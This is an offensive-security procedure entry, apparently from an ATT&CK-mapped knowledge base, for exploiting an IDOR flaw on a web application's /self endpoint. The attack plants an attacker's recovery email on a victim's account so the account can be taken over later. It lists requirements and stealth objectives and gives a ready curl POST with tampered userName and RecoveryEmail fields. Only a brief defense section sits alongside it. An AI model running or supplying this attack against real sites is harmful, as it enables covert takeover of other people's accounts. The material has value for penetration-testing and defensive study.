---
tags:
  - idor
  - account-manipulation
type: procedure
tools:
  - '[[tools/Firefox-Multi-Account-Containers]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/curl-modify-recovery-email]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:25:23.471Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: bde33a1b-37a9-4ab9-89cb-ed646a1f0e5c
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Account Manipulation]]'
---
# Modify-Self-Request-to-Add-Attacker-Recovery-Email

## Summary

This procedure uses IDOR to modify the /self endpoint, adding the attacker's recovery email to a victim's account for subsequent takeover.

## Description

By altering the POST to /self with victim's details and attacker's email in RecoveryEmail, without ownership checks, the attacker injects control. Requires victim to lack a verified recovery email; uses valid session and token.

## Requirements

1. Victim's username and email (from prior disclosure)
2. Attacker's email
3. Valid __RequestVerificationToken and cookies
4. Proxy for request modification

## Defense

Defensive measures and detection strategies:

- Validate user ownership via session user ID matching request parameters
- Audit logs for mismatched userName in /self requests
- Require re-authentication for email changes

## Objectives

1. Inject attacker-controlled recovery email
2. Enable password reset redirection
3. Maintain stealth without alerting victim

## Instructions

### Step 1: Gather Parameters

**Context**: Collect victim's info and prepare token from a legitimate request.

Intercept a valid /self request to get __RequestVerificationToken.

### Step 2: Craft and Send Modified Request

**Context**: Replay with tampered parameters to add recovery email.

Execute [[commands/curl-modify-recovery-email]]:

```bash
curl -X POST https://target-site.com/self \
  -H "Cookie: session=valid_session" \
  -H "__RequestVerificationToken: token_value" \
  -d "userName=victim_username&originalEmail=victim@example.com&Email=victim@example.com&RecoveryEmail=attacker@example.com" \
  -v
```

> Successful response indicates email added; check for errors indicating verified recovery presence.

**Expected Output**: 200 OK, confirming update.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Account Manipulation]]

### Sub-Techniques


## Commands Used

- [[commands/curl-modify-recovery-email]]

## Tools Used

- [[tools/Firefox-Multi-Account-Containers]]

## Tags

- idor
- account-manipulation
